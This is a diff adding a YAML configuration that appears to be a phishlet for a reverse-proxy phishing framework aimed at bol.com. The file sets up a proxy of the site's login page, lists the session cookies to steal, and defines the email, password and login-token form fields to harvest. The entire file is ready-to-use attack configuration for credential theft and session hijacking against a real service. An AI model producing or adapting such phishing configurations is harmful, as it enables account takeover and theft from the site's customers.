@@ -1,0 +1,29 @@
+author: '@MelroyB'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'bol.com', session: true, is_landing: true}
+ 
+
+sub_filters:
+  - {triggers_on: 'bol.com', orig_sub: '', domain: 'bol.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html']}
+
+auth_tokens:
+  - domain: '.bol.com'
+    keys: ['bltgSessionID', 'BUI','P','s_cc','s_fid']
+
+credentials:
+  username:
+    key: 'emailr'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    key: 'loginToken' 
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'www.bol.com'
+  path: '/nl/account/login.html'
